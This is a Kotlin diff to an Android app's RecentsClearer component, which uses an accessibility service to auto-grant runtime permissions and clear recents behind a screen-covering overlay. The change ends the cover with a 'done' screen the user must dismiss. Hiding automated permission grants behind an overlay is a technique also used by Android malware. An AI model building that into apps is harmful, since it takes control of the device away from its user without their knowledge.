@@ -64,7 +64,7 @@ internal object RecentsClearer {
             !prefs(app).getBoolean(KEY_DONE, false)
         if (!wantRecents) {
             Log.i(TAG, "post-setup skip — recents off")
-            hideCover()
+            finishCover()
             return
         }
         if (!armed.compareAndSet(false, true)) {
@@ -433,23 +433,24 @@ internal object RecentsClearer {
         panelHolds.set(0)
         sawFirstAction.set(false)
         main.removeCallbacks(tick)
-        hideCover()
+        finishCover()
         if (failed) Log.w(TAG, "recents clear disarmed without mark")
     }
 
     private fun keepCover(context: Context) {
         if (AutoGrantDebug.hideCover) return
-        val runtimeN = AutoGrantProgress.effectiveRuntimePermissions(context).size
-        val total = runtimeN + 3
-        val line = context.getString(R.string.perm_auto_grant_overlay_progress, total, total)
+        val total = AutoGrantProgress.effectiveRuntimePermissions(context).size + 3
         main.post {
-            PermissionsAutoGrant.overlayControl?.showAutoGrantOverlay(line)
+            PermissionsAutoGrant.overlayControl?.showAutoGrantOverlay(total, total, cleanup = true)
             PermissionsAutoGrant.stabilizeOverlay()
         }
     }
 
-    private fun hideCover() {
-        main.post { PermissionsAutoGrant.overlayControl?.hideAutoGrantOverlay() }
+    private fun finishCover() {
+        main.post {
+            // تا کاربر «متوجه شدم» نزند Cover باز می‌ماند.
+            PermissionsAutoGrant.overlayControl?.showAutoGrantDoneOverlay(hideAfterMs = 0L)
+        }
     }
 
     private fun goHome(service: AccessibilityService) {
